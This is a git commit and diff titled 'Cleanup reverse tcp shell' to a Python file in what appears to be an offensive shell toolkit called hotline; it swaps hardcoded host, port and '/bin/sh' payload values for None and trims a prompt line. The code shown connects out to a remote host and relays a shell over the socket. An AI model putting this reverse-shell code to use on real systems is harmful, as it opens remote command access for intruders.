23f00985d33d2f99e864b3189b25f3b5c97a5228
Nicklaus McClendon <nicklaus@kulinacs.com>
2017-08-03 18:00:36 -0500

    Cleanup reverse tcp shell

--- hotline/shells/tcp/reverse.py
+++ hotline/shells/tcp/reverse.py
@@ -2,9 +2,9 @@ import socket
 import time
 from hotline.shells import Shell
 
-RHOST = '127.0.0.1'
-RPORT = 1730
-PAYLOAD = ['/bin/sh']
+RHOST = None
+RPORT = None
+PAYLOAD = [None]
 
 
 def main():
@@ -12,7 +12,6 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((RHOST, RPORT))
     while True:
-        s.sendall('> '.encode('utf8'))
         shell.write(s.recv(1024).decode('utf8'))
         time.sleep(.01)
         while shell.can_read():
